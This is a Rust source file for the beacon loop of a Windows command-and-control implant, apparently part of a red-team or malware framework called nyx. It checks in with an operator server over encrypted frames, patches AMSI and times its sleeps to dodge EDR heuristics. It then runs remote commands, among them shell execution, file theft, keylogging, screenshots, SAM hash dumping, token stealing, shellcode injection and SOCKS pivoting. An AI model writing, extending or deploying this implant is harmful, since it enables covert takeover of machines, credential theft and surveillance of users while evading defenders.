//! Beacon task loop for the PIC implant.
//!
//! Mirrors agent-dev's loop but `no_std`: check-in (SessionInfo) → every sleep
//! cycle, POST last cycle's responses, receive tasks, execute, repeat. The
//! crypto/frame layer is reused verbatim from [`nyx_protocol`]; only the
//! transport (WinHTTP) and the sleeper differ.
//!
//! The command dispatch covers every wire `Command` variant (all 28 wire
//! Command variants): file ops, shell, recon, BOF, screenshot, keylog,
//! hashdump, connect/socks relay, etc. — all route to real implementations
//! (none are stubs).

#![cfg(target_os = "windows")]

use crate::config::{self, Config};
use crate::config_placeholder::{self, ImplantConfig};
use crate::heap::{vec, String, Vec};
use nyx_protocol::{
    encode_frame, open_frame_dir, parse_frame, wire::Writer, Command, Direction, ImplantKeypair,
    Response, SessionInfo, Task, TaskResponse,
};

/// Runtime-configurable sleep interval (seconds). Updated by the `Sleep`
/// command so an operator can re-task beacon cadence live. Defaults to the
/// config's `sleep_seconds`; an AtomicU32 keeps the read+write lock-free in the
/// single beacon thread.
static SLEEP_SECS: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(5);

/// Margin kept under `protocol::frame::MAX_CT_LEN` (256 KiB) when batching
/// responses into one frame. A streamed Download or Screenshot can exceed the
/// frame cap; we flush early when the accumulated batch would cross this.
const BATCH_FLUSH: usize = 200 * 1024;

/// Pump pending window messages so rundll32's hidden window doesn't block.
/// rundll32 creates a window and expects the entry function to handle messages.
/// Without pumping, the system considers the process unresponsive and may kill it.
fn pump_window_messages() {
    // PEB-resolve PeekMessageW + DispatchMessageW + TranslateMessage from user32.dll.
    // These are no-ops if user32.dll isn't loaded (e.g. loaded into a non-GUI process).
    unsafe {
        let peek = crate::resolve::export_addr(b"user32.dll", b"PeekMessageW");
        let dispatch = crate::resolve::export_addr(b"user32.dll", b"DispatchMessageW");
        let (Some(peek), Some(dispatch)) = (peek, dispatch) else {
            return; // user32 not loaded — nothing to pump.
        };
        // PeekMessageW(msg, hwnd=NULL, 0, 0, PM_REMOVE=1) -> BOOL
        type PeekMessageW = unsafe extern "system" fn(*mut [u8; 48], *mut core::ffi::c_void, u32, u32, u32) -> i32;
        type DispatchMessageW = unsafe extern "system" fn(*const [u8; 48]) -> usize;
        let peek_fn: PeekMessageW = core::mem::transmute(peek);
        let dispatch_fn: DispatchMessageW = core::mem::transmute(dispatch);
        let mut msg: [u8; 48] = [0; 48]; // MSG struct on x64 = 48 bytes
        while peek_fn(&mut msg, core::ptr::null_mut(), 0, 0, 1) != 0 {
            dispatch_fn(&msg);
        }
    }
}

/// When false (noevasion mode), beacon_loop skips AMSI patching, keylog
/// polling, and channel pumping — all of which depend on the evasion init
/// (hookchain/blind) that `init_minimal` skips.
static EVASION_ACTIVE: core::sync::atomic::AtomicBool = core::sync::atomic::AtomicBool::new(true);

/// Called by entry.rs before beacon_loop to disable evasion-dependent calls.
pub fn set_evasion_off() {
    EVASION_ACTIVE.store(false, core::sync::atomic::Ordering::Release);
}

/// Whether the full evasion init (hookchain/blind/mask-region registration)
/// ran. When false (noevasion mode — `init_minimal` path), sleep masking must
/// NOT engage because `mem::mask()` never registered the .text/config/key
/// regions, and fluctuation would crash on the unmask step. `kits::sleep`
/// gates on this before routing to `fluctuation::sleep`.
pub fn evasion_active() -> bool {
    EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire)
}

// ── Beacon state ────────────────────────────────────────────────────────────

/// Initialization state passed from [`beacon_init`] to the main loop.
struct BeaconInit {
    cfg: Config,
    implant: ImplantConfig,
    kp: ImplantKeypair,
    key: nyx_protocol::crypto::SessionKey,
    pubkey: [u8; 32],
    info_plain: Vec<u8>,
    rt: Option<&'static crate::syscalls::Runtime>,
    ch_ctx: crate::channels::ChannelCtx,
}

// ── Initialization ──────────────────────────────────────────────────────────

/// Load config, build keypair, enumerate host, and initialize channels.
/// Returns the beacon state on success, or returns early (via the caller)
/// when the CSPRNG fails.
unsafe fn beacon_init() -> Option<BeaconInit> {
    crate::entry::diag_mark(b"L0_loop_start");
    // Try per-implant runtime config first (patched .nyx_cfg section).
    // Falls back to compile-time config if the section is unpatched.
    let (cfg, implant, config_plain) =
        if let Some((c, i, p)) = config_placeholder::load_runtime_config() {
            (c, i, p)
        } else {
            let (c, p) = config::load();
            (c, ImplantConfig::default(), p)
        };
    SLEEP_SECS.store(cfg.sleep_seconds, core::sync::atomic::Ordering::Relaxed);

    // Leak the decrypted config plaintext and register it with the memory
    // mask so it is RC4-encrypted during sleep.
    crate::mem::register_owned(config_plain);

    // Initialize the channel dispatcher.
    let ch_ctx = crate::channels::ChannelCtx::from_config(&cfg);
    crate::channels::set_active(crate::channels::Channel::from_u8(cfg.primary_channel));

    // Per-implant keypair.
    let kp = if let Some(ref priv_bytes) = implant.implant_priv {
        ImplantKeypair::from_secret_bytes(*priv_bytes)
    } else {
        match ImplantKeypair::generate() {
            Ok(k) => k,
            Err(_) => {
                crate::entry::diag_mark(b"ERR_KEYGEN_CSPRNG");
                return None;
            }
        }
    };
    let key = kp.session_key(&cfg.server_pub);
    crate::mem::register_key(*key.as_bytes());
    let pubkey = kp.public_bytes();

    // Real host enumeration.
    let info = SessionInfo {
        beacon_id: crate::hostinfo::beacon_id(),
        hostname: crate::hostinfo::hostname(),
        username: crate::hostinfo::username(),
        os: crate::hostinfo::os(),
        arch: crate::hostinfo::arch(),
        pid: crate::hostinfo::pid(),
        is_admin: crate::hostinfo::is_admin(),
        auth_token: implant.auth_token,
    };
    let mut info_writer = Writer::new();
    if info.encode(&mut info_writer).is_err() {
        crate::entry::diag_mark(b"ERR_SESSIONINFO_ENCODE");
        return None;
    }
    let info_plain = info_writer.into_bytes();
    let rt = crate::syscalls::global();
    crate::entry::diag_mark(b"L1_rt");

    Some(BeaconInit { cfg, implant, kp, key, pubkey, info_plain, rt, ch_ctx })
}

// ── Check-in ────────────────────────────────────────────────────────────────

/// Run the check-in retry loop. Returns the next frame counter on success,
/// or 0 to signal the caller to fall through to the task loop anyway
/// (the server may have registered us even if we didn't get a reply).
unsafe fn beacon_checkin(
    pubkey: &[u8; 32],
    key: &nyx_protocol::crypto::SessionKey,
    info_plain: &[u8],
    cfg: &Config,
    ch_ctx: &crate::channels::ChannelCtx,
) -> u64 {
    const MAX_CHECKIN_RETRIES: u32 = 5;
    let mut counter = 0u64;
    let mut attempts = 0u32;
    loop {
        let frame = match encode_frame(pubkey, counter, key, info_plain) {
            Ok(f) => f,
            Err(_) => {
                sleep_jitter(
                    SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed),
                    cfg.jitter_pct,
                );
                continue;
            }
        };
        counter += 1;
        crate::entry::diag_mark(b"L2_checkin_send");
        let resp = crate::channels::dispatch_send_recv(ch_ctx, crate::channels::get_active(), &frame);
        crate::entry::diag_mark(b"L3_checkin_recv");
        if resp.is_some() {
            return counter;
        }
        attempts += 1;
        if attempts >= MAX_CHECKIN_RETRIES {
            return counter;
        }
        sleep_jitter(
            SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed),
            cfg.jitter_pct,
        );
    }
}

// ── Per-cycle helpers ───────────────────────────────────────────────────────

/// Enforce kill-date, retry AMSI blinding, sleep, pump messages, poll keylog,
/// drain relay sockets. Returns true if the beacon should continue.
fn beacon_cycle_setup(
    implant: &ImplantConfig,
    cycle: &mut u32,
    amsi_patched: &mut bool,
    cfg: &Config,
    pending: &mut Vec<TaskResponse>,
) -> bool {
    // Kill-date enforcement.
    if implant.expires_at != 0 {
        let now = crate::hostinfo::now_unix();
        if now != 0 && now >= implant.expires_at {
            return false;
        }
    }
    // Retry AMSI blinding: capped at 10 cycles.
    if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire)
        && !*amsi_patched
        && *cycle < 10
    {
        unsafe { crate::blind::maybe_patch_amsi(); }
        *amsi_patched = crate::blind::amsi_patched();
    }
    let secs = SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed);
    *cycle = cycle.saturating_add(1);
    pump_window_messages();
    sleep_jitter(secs, cfg.jitter_pct);
    // Poll keyboard once per cycle.
    if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) {
        crate::keylog::poll_once();
    }
    // Drain relay sockets.
    if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire) {
        for r in crate::pivot::pump_channels() {
            pending.push(TaskResponse { task_id: 0, response: r });
        }
    }
    true
}

/// Encode + send the pending batch, advancing counter on success.
/// On send failure, tries fallback channels.
fn beacon_send_frame(
    pubkey: &[u8; 32],
    counter: &mut u64,
    key: &nyx_protocol::crypto::SessionKey,
    pending: &mut Vec<TaskResponse>,
    ch_ctx: &crate::channels::ChannelCtx,
) -> Option<Vec<u8>> {
    let frame = match encode_frame(pubkey, *counter, key, &encode_batch(pending)) {
        Ok(f) => f,
        Err(_) => return None,
    };
    *counter += 1;
    pending.clear();
    let body = crate::channels::dispatch_send_recv(ch_ctx, crate::channels::get_active(), &frame);
    match body {
        Some(b) => Some(b),
        None => {
            let active = crate::channels::get_active();
            if let Some(fb) = crate::channels::next_fallback(active) {
                crate::channels::set_active(fb);
            } else {
                crate::channels::set_active(crate::channels::PRIMARY_CHANNEL);
            }
            None
        }
    }
}

/// Decode server reply into tasks, dispatch each command, and flush mid-cycle
/// when the batch exceeds BATCH_FLUSH.
unsafe fn beacon_dispatch_tasks(
    body: &[u8],
    key: &nyx_protocol::crypto::SessionKey,
    pubkey: &[u8; 32],
    counter: &mut u64,
    cfg: &Config,
    rt: Option<&'static crate::syscalls::Runtime>,
    ch_ctx: &crate::channels::ChannelCtx,
    pending: &mut Vec<TaskResponse>,
) -> bool {
    let Ok(raw) = parse_frame(body) else { return true };
    let Ok(plaintext) = open_frame_dir(key, Direction::ServerToClient, &raw) else { return true };
    let Ok(tasks) = Task::decode_vec(&plaintext) else { return true };

    for t in tasks {
        if matches!(t.command, Command::Exit) {
            return false;
        }
        for response in execute(rt, t.command, counter, pubkey, key, cfg) {
            pending.push(TaskResponse { task_id: t.task_id, response });
            // Flush mid-cycle if batch nears frame cap.
            if pending_batch_size(pending) > BATCH_FLUSH {
                let frame = match encode_frame(pubkey, *counter, key, &encode_batch(pending)) {
                    Ok(f) => f,
                    Err(_) => continue,
                };
                let sent = crate::channels::dispatch_send_recv(
                    ch_ctx,
                    crate::channels::get_active(),
                    &frame,
                );
                if sent.is_some() {
                    *counter += 1;
                    pending.clear();
                }
            }
        }
    }
    true
}

// ── Main loop ───────────────────────────────────────────────────────────────

/// The beacon loop, called from `nyx_entry` after resolve + alloc bootstrap.
pub unsafe fn beacon_loop() {
    let init = match beacon_init() {
        Some(s) => s,
        None => return,
    };
    let BeaconInit { cfg, implant, key, pubkey, info_plain, rt, ch_ctx, .. } = init;

    // Check-in retry.
    let mut counter = beacon_checkin(&pubkey, &key, &info_plain, &cfg, &ch_ctx);

    // Task loop.
    let mut pending: Vec<TaskResponse> = Vec::new();
    let mut cycle: u32 = 0;
    let mut amsi_patched = false;
    loop {
        // Per-cycle setup: kill-date, AMSI, sleep, keylog, channel drain.
        if !beacon_cycle_setup(&implant, &mut cycle, &mut amsi_patched, &cfg, &mut pending) {
            return;
        }

        // Encode + send pending batch, receive server reply.
        let Some(body) = beacon_send_frame(&pubkey, &mut counter, &key, &mut pending, &ch_ctx) else {
            continue;
        };

        // Decode reply, dispatch tasks, flush mid-cycle.
        if !beacon_dispatch_tasks(&body, &key, &pubkey, &mut counter, &cfg, rt, &ch_ctx, &mut pending) {
            return;
        }
    }
}

/// **Integration-test entry**: run the real beacon check-in + ONE task cycle
/// against the configured server, then exit with a status code. Exercises the
/// full production path — config load, ECDH session key, WinHTTP POST, frame
/// AEAD encode/decode, SessionInfo check-in, task decode, command dispatch,
/// response encode — without the infinite loop. Invoke via
/// `rundll32 nyx_implant_win.dll,nyx_beacon_oneshot`.
///
/// Exit codes:
///   1 = check-in succeeded (SessionInfo accepted by the server)
///       its response POSTed back (full round-trip)
///   0xC0..0xCF = a specific step failed (see inline comments)
#[allow(unused_assignments)]
pub unsafe fn beacon_oneshot() -> u32 {
    // Try per-implant config first, fall back to compile-time (dev path).
    let (cfg, implant, config_plain) =
        if let Some((c, i, p)) = config_placeholder::load_runtime_config() {
            (c, i, p)
        } else {
            let (c, p) = config::load();
            (c, ImplantConfig::default(), p)
        };
    crate::mem::register_owned(config_plain);
    // DIAG step 1: config loaded OK
    crate::entry::diag_mark(b"b1_config");

    // Initialize channel dispatcher (same as beacon_loop).
    let ch_ctx = crate::channels::ChannelCtx::from_config(&cfg);
    crate::channels::set_active(crate::channels::Channel::from_u8(cfg.primary_channel));
    crate::entry::diag_mark(b"b2_channel");

    let kp = if let Some(ref priv_bytes) = implant.implant_priv {
        ImplantKeypair::from_secret_bytes(*priv_bytes)
    } else {
        match ImplantKeypair::generate() {
            Ok(k) => k,
            Err(_) => {
                crate::entry::diag_mark(b"ERR_ONESHOT_CSPRNG");
                return 0xAF; // CSPRNG failure exit code
            }
        }
    };
    // DIAG step 2: keygen done (if we crash here → CSPRNG or curve25519)
    crate::entry::diag_mark(b"b3_keygen");
    let key = kp.session_key(&cfg.server_pub);
    // DIAG step 3: session_key (HKDF) done
    crate::entry::diag_mark(b"b4_skey");
    crate::mem::register_key(*key.as_bytes());
    let pubkey = kp.public_bytes();

    let info = SessionInfo {
        beacon_id: crate::hostinfo::beacon_id(),
        hostname: crate::hostinfo::hostname(),
        username: crate::hostinfo::username(),
        os: crate::hostinfo::os(),
        arch: crate::hostinfo::arch(),
        pid: crate::hostinfo::pid(),
        is_admin: crate::hostinfo::is_admin(),
        auth_token: implant.auth_token,
    };
    let mut info_writer = Writer::new();
    // P0-4: bail out with a failure exit code instead of panicking. See the
    // matching note in beacon_loop — SessionInfo is bounded, so this branch is
    // effectively unreachable, but panic=abort makes a bare expect fatal.
    if info.encode(&mut info_writer).is_err() {
        crate::entry::diag_mark(b"ERR_ONESHOT_SESSIONINFO");
        return 0xC2; // SessionInfo encode failed (malformed Writer state)
    }
    let info_plain = info_writer.into_bytes();
    let rt = crate::syscalls::global();
    crate::entry::diag_mark(b"b5_info");

    // ---- check-in (retry up to ~30s) ----
    let mut counter = 0u64;
    let mut checked_in = false;
    for _ in 0..10 {
        let frame = match encode_frame(&pubkey, counter, &key, &info_plain) {
            Ok(f) => f,
            Err(_) => {
                crate::entry::diag_mark(b"ERR_ONESHOT_SEAL_CHECKIN");
                return 0xC3; // check-in frame seal failed (AEAD alloc failure)
            }
        };
        counter += 1;
        crate::entry::diag_mark(b"b6_send");
        if unsafe {
            crate::channels::dispatch_send_recv(
                &ch_ctx,
                crate::channels::get_active(),
                &frame,
            )
        }
        .is_some()
        {
            checked_in = true;
            crate::entry::diag_mark(b"b7_sent");
            break;
        }
        sleep_jitter(3, 0);
    }
    if !checked_in {
        return 0xC1; // check-in failed (server unreachable / crypto mismatch)
    }

    // ---- poll for tasks (a few short cycles to give the operator time to
    // queue one via POST /api/task) ----
    let mut got_task = false;
    for _ in 0..6 {
        crate::entry::diag_mark(b"b7a_before_sleep");
        sleep_jitter(2, 0);
        crate::entry::diag_mark(b"b7b_after_sleep");
        // POST empty batch, receive any queued tasks. An empty batch has no
        // blobs, so encode_vec cannot hit MAX_BLOB_LEN — but use unwrap_or_default
        // so a malformed Writer state never aborts the beacon (P0-4).
        let frame = match encode_frame(
            &pubkey,
            counter,
            &key,
            &TaskResponse::encode_vec(&[]).unwrap_or_default(),
        ) {
            Ok(f) => f,
            Err(_) => {
                crate::entry::diag_mark(b"ERR_ONESHOT_SEAL_POLL");
                return 0xC3; // poll frame seal failed (AEAD alloc failure)
            }
        };
        counter += 1;
        crate::entry::diag_mark(b"b8_poll");
        let body = unsafe {
            crate::channels::dispatch_send_recv(
                &ch_ctx,
                crate::channels::get_active(),
                &frame,
            )
        };
        let Some(body) = body else {
            continue;
        };
        let Ok(raw) = parse_frame(&body) else {
            continue;
        };
        let Ok(plaintext) = open_frame_dir(&key, Direction::ServerToClient, &raw) else {
            continue;
        };
        let Ok(tasks) = Task::decode_vec(&plaintext) else {
            continue;
        };

        if tasks.is_empty() {
            continue; // no task queued yet, keep polling
        }
        got_task = true;
        // Execute + POST results back (one cycle, then we're done).
        let mut pending: Vec<TaskResponse> = Vec::new();
        for t in tasks {
            if matches!(t.command, Command::Exit) {
                break;
            }
            for response in execute(rt, t.command, &mut counter, &pubkey, &key, &cfg) {
                pending.push(TaskResponse {
                    task_id: t.task_id,
                    response,
                });
            }
        }
        if !pending.is_empty() {
            // P0-4: encode_batch swaps any oversized Response for an Err so the
            // frame always encodes instead of aborting the beacon.
            let rframe = match encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending))
            {
                Ok(f) => f,
                Err(_) => {
                    crate::entry::diag_mark(b"ERR_ONESHOT_SEAL_FLUSH");
                    // Keep `pending` (do not advance counter) so the responses
                    // are retried — but oneshot exits after this cycle, so just
                    // break out of the response loop.
                    break;
                }
            };
            let sent = unsafe {
                crate::channels::dispatch_send_recv(
                    &ch_ctx,
                    crate::channels::get_active(),
                    &rframe,
                )
            };
            // P0-3: only advance the counter when the send actually succeeded,
            // so a failed round-trip doesn't desync the sequence number.
            if sent.is_some() {
                counter += 1;
            }
        }
        break;
    }
    if got_task {
        2
    } else {
        1
    }
}
/// Encode a batch of [`TaskResponse`]s for the wire, gracefully handling an
/// oversized payload. `TaskResponse::encode_vec` only fails when a blob
/// exceeds `wire::MAX_BLOB_LEN` (256 KiB) — in practice a screenshot BMP or
/// large BOF output. Since `panic = "abort"`, letting that propagate kills the
/// beacon; instead we replace each oversized [`Response`] with a tiny
/// `Response::Err` and retry. The operator sees what was dropped instead of
/// the implant dying. `Response::Err` messages are themselves bounded well
/// under `MAX_BLOB_LEN`, so the retry always succeeds.
fn encode_batch(pending: &mut Vec<TaskResponse>) -> Vec<u8> {
    if let Ok(v) = TaskResponse::encode_vec(pending) {
        return v;
    }
    // One or more responses carried a blob > MAX_BLOB_LEN. Replace each
    // oversized payload with an Err so the batch encodes (and the operator is
    // told what was dropped rather than the beacon aborting).
    for tr in pending.iter_mut() {
        let too_big = match &tr.response {
            Response::FileChunk { data, .. }
            | Response::Output(data)
            | Response::BofOutput(data)
            | Response::Image(data)
            | Response::Channel { data, .. } => data.len() > nyx_protocol::wire::MAX_BLOB_LEN,
            Response::Ok | Response::Err(_) => false,
        };
        if too_big {
            tr.response = Response::Err(String::from(
                "response too large: payload exceeds MAX_BLOB_LEN",
            ));
        }
    }
    TaskResponse::encode_vec(pending).unwrap_or_default()
}

/// Only FileChunk/Output/BofOutput/Image carry significant volume; acks and
/// errors are negligible. Mirrors agent-dev's heuristic.
fn pending_batch_size(pending: &[TaskResponse]) -> usize {
    pending
        .iter()
        .map(|tr| match &tr.response {
            Response::FileChunk { data, .. } => data.len(),
            Response::Output(d) | Response::BofOutput(d) | Response::Image(d) => d.len(),
            _ => 0,
        })
        .sum()
}

/// Execute a command, returning zero or more responses. `counter`/`pubkey`/`key`
/// /`cfg` are passed so a streamed response (or a flush) can be emitted directly
/// inside this call if needed (kept for parity with agent-dev; currently unused
/// because the beacon loop flushes between tasks).
#[allow(clippy::too_many_arguments)]
fn execute(
    rt: Option<&'static crate::syscalls::Runtime>,
    cmd: Command,
    _counter: &mut u64,
    _pubkey: &[u8; 32],
    _key: &nyx_protocol::crypto::SessionKey,
    _cfg: &Config,
) -> Vec<Response> {
    match cmd {
        Command::Ping => vec![Response::Ok],
        Command::Sleep {
            seconds,
            jitter_pct: _,
        } => {
            // Re-task the beacon cadence: store the new interval for the loop
            // to read next cycle. (jitter_pct is config-wide; we honor the
            // configured jitter and only adjust the base interval live, like
            // the dev agent's pragmatic read of the field.)
            if seconds > 0 {
                SLEEP_SECS.store(seconds, core::sync::atomic::Ordering::Relaxed);
            }
            vec![Response::Ok]
        }
        Command::SetChannel { channel } => {
            // Use from_u8 (new numbering scheme). Values 0-8 map to channels;
            // out-of-range values default to Https (not SmbPipe — the old bug
            // MED-NEW-I5 where _ => SmbPipe killed the beacon with a "success"
            // ack is fixed: from_u8's catch-all is Https, a safe no-op).
            let ch = crate::channels::Channel::from_u8(channel);
            crate::channels::set_active(ch);
            let mut out: crate::heap::Vec<u8> = crate::heap::Vec::new();
            out.extend_from_slice(b"Channel set to: ");
            out.extend_from_slice(ch.name().as_bytes());
            vec![Response::Output(out)]
        }
        Command::Trex => {
            let assessment = unsafe { crate::trex::assess_user_mode() };
            let mut out: crate::heap::Vec<u8> = crate::heap::Vec::new();
            let tier_names: &[&[u8]] = &[
                b"Clean",
                b"ConsumerAV",
                b"EnterpriseEDR",
                b"KernelArmed",
                b"Fortress",
            ];
            let tn = tier_names
                .get(assessment.tier as usize)
                .map_or(&b"Unknown"[..], |s| *s);
            out.extend_from_slice(b"=== T-REX ===\nTier: ");
            out.extend_from_slice(tn);
            out.extend_from_slice(b"\nProducts: ");
            let n = assessment.products.len();
            if n == 0 {
                out.extend_from_slice(b"none");
            }
            for (i, p) in assessment.products.iter().enumerate() {
                if i > 0 {
                    out.extend_from_slice(b", ");
                }
                out.extend_from_slice(p.vendor.default_name().as_bytes());
            }
            out.extend_from_slice(b"\n");
            out.extend_from_slice(assessment.recommendation.as_bytes());
            vec![Response::Output(out)]
        }
        Command::Exit => vec![Response::Ok],
        Command::Shell { args } => vec![crate::shell::run_shell(&args)],
        Command::Upload { name, data } => match rt {
            Some(rt) => vec![crate::fs::do_upload(rt, &name, &data)],
            None => vec![Response::Err(String::from("upload: syscall runtime down"))],
        },
        Command::Download { path } => match rt {
            Some(rt) => crate::fs::do_download(rt, &path),
            None => vec![Response::Err(String::from(
                "download: syscall runtime down",
            ))],
        },
        Command::FileOp { op, path, dest } => match rt {
            Some(rt) => vec![crate::fs::do_fileop(rt, op, &path, dest.as_deref())],
            None => vec![Response::Err(String::from("fileop: syscall runtime down"))],
        },
        // Load + run a CS-compatible BOF (W^X mapping, Beacon-API shim).
        // Captured BeaconPrintf/BeaconOutput output comes back as BofOutput.
        Command::Bof { name, args, blob } => vec![crate::bof::run(&name, &args, &blob)],
        Command::DriveInfo => vec![crate::recon::do_driveinfo()],
        Command::Env { name } => vec![crate::recon::do_env(&name)],
        Command::Clipboard => vec![crate::recon::do_clipboard()],
        Command::Portscan { host, ports } => vec![crate::recon::do_portscan(&host, &ports)],
        Command::Net { query } => vec![crate::recon::do_net(&query)],
        // ---- Surveillance commands (implemented) ----
        // Screenshot: GDI capture → BMP, streamed as FileChunks.
        Command::Screenshot { monitor } => crate::screenshot::do_screenshot(monitor),
        // Keylogger: start/stop flip an AtomicBool sampled each cycle; dump
        // returns the captured buffer. (Polling — see keylog.rs for the honest
        // limitation vs a hook-based logger.)
        Command::Keylog { action } => vec![crate::keylog::do_keylog(action)],
        // Screenwatch: capture `interval_secs` apart for a few frames. The
        // synchronous beacon loop can't host a true periodic timer, so this
        // captures a small burst (3 frames) blocking the loop — documented as
        // a stopgap until the persistent-task refactor.
        Command::Screenwatch { interval_secs } => {
            let mut all: Vec<Response> = Vec::new();
            for i in 0..3u8 {
                if i > 0 {
                    crate::kits::sleep(interval_secs.max(1));
                }
                let mut frame = crate::screenshot::do_screenshot(0);
                // Tag the chunk name with the frame index so the operator can
                // tell frames apart in the reassembled stream.
                for r in frame.iter_mut() {
                    if let Response::FileChunk { name, .. } = r {
                        // name is "screenshot.bmp" → "screenwatch-{i}.bmp"
                        let mut new_name = String::from("screenwatch-");
                        new_name.push((b'0' + i) as char);
                        new_name.push_str(".bmp");
                        *name = new_name;
                    }
                }
                all.extend(frame);
            }
            all
        }
        // ---- Credential extraction + pivoting (implemented) ----
        // Hashdump: stream the SAM/SYSTEM hive (encrypted) for offline parsing.
        // (LSASS memory dump is a separate, riskier path — deferred.)
        Command::Hashdump { method } => crate::hashdump::do_hashdump_vec(rt, method),
        // Connect/Socks: open + confirm reachability, report channel status.
        // Full relay is deferred (synchronous-poll loop can't host it) — see
        // pivot.rs for the honest limitation.
        Command::Connect {
            proto,
            host,
            port,
            chan,
        } => {
            vec![crate::pivot::do_connect(proto, &host, port, chan)]
        }
        Command::Socks {
            chan,
            op,
            addr,
            port,
        } => {
            vec![crate::pivot::do_socks(chan, op, &addr, port)]
        }
        // Relay data/close: forward to the channel table (pivot.rs).
        Command::ChannelData { chan, data } => vec![crate::pivot::channel_data(chan, &data)],
        Command::ChannelClose { chan } => vec![crate::pivot::channel_close(chan)],
        // ---- Post-exploitation token operations (lateral movement) ----
        // Steal/make a token, hold it process-wide; revert drops impersonation
        // but keeps the token; getuid reports the current thread identity.
        Command::StealToken { pid } => match unsafe { crate::postex::steal_token(pid) } {
            Ok(()) => vec![Response::Ok],
            Err(m) => vec![Response::Err(m.into())],
        },
        Command::MakeToken {
            domain,
            user,
            password,
            logon_type,
        } => match unsafe { crate::postex::make_token(&domain, &user, &password, logon_type) } {
            Ok(()) => vec![Response::Ok],
            Err(m) => vec![Response::Err(m.into())],
        },
        Command::Rev2Self => match crate::postex::revert() {
            Ok(()) => vec![Response::Ok],
            Err(m) => vec![Response::Err(m.into())],
        },
        Command::GetUid => vec![Response::Output(crate::postex::getuid().into_bytes())],
        Command::Inject {
            method,
            pid,
            spawn_to,
            shellcode,
        } => {
            vec![crate::inject::do_inject(
                method,
                pid,
                spawn_to.as_str(),
                shellcode.as_slice(),
            )]
        }
    }
}

/// Sleep N seconds via `NtWaitForSingleObject(INVALID_HANDLE_VALUE, Alertable=FALSE,
/// &interval)`. This gives wait-reason `UserRequest` instead of `DelayExecution`,
/// defeating Hunt-Sleeping-Beacons heuristics. Falls back to the resolved export
/// if the indirect-syscall runtime is not yet up, then to NtDelayExecution as a
/// last resort.
pub fn sleep_seconds(seconds: u32) {
    type NtWaitForSingleObject = unsafe extern "system" fn(usize, u8, *const i64) -> i32;
    type NtDelayExecution = unsafe extern "system" fn(u8, *const i64) -> i32;
    let delay_100ns: i64 = -(seconds as i64).saturating_mul(10_000_000); // relative, 100ns units
    const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
    // Prefer the indirect-syscall runtime (RIP lands in ntdll). This is the
    // canonical "runtime is live" path now that entry initializes it.
    if let Some(rt) = crate::syscalls::global() {
        let called = unsafe {
            crate::syscalls::nt_wait_for_single_object(
                rt,
                INVALID_HANDLE, // INVALID_HANDLE_VALUE → UserRequest wait-reason
                0,              // not alertable (floor sleep)
                &delay_100ns as *const i64 as usize,
            )
        };
        if called.is_some() {
            return;
        }
    }
    // Fall back to the resolved NtWaitForSingleObject export (pre-runtime path,
    // or if indirect runtime init failed). Still gives UserRequest wait-reason.
    if let Some(addr) =
        unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtWaitForSingleObject") }
    {
        let f: NtWaitForSingleObject = unsafe { core::mem::transmute(addr) };
        unsafe { f(INVALID_HANDLE, 0, &delay_100ns as *const i64) };
        return;
    }
    // Last resort: NtDelayExecution (wait-reason will be DelayExecution, but
    // at least we still sleep). Only reached if NtWaitForSingleObject is absent.
    if let Some(addr) = unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtDelayExecution") } {
        let f: NtDelayExecution = unsafe { core::mem::transmute(addr) };
        unsafe { f(0, &delay_100ns as *const i64) };
        return;
    }
    // Should not happen on a real host, but never infinite-spin.
    let spins = seconds.min(60) as u64 * 10_000_000;
    for _ in 0..spins {
        core::hint::spin_loop();
    }
}

/// Sleep `base` seconds, varied by ±jitter_pct% so beacon timing isn't a
/// metronome (a fixed-period beacon is a trivial NDR/EDR signature).
fn sleep_jitter(base: u32, jitter_pct: u8) {
    if jitter_pct == 0 || base == 0 {
        crate::kits::sleep(base);
        return;
    }
    // Cheap LCG over a static seed — no need for a CSPRNG here (this only
    // shapes sleep length, not anything secret). xorshift32.
    static SEED: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(0x9E37_79B9);
    let mut x = SEED.load(core::sync::atomic::Ordering::Relaxed);
    if x == 0 {
        x = 0x9E37_79B9;
    }
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    SEED.store(x, core::sync::atomic::Ordering::Relaxed);
    let span = (base as u32).saturating_mul(jitter_pct as u32) / 100;
    let off = if span > 0 { x % (2 * span) } else { 0 };
    let actual = base.saturating_add(off).saturating_sub(span);
    crate::kits::sleep(actual.max(1));
}
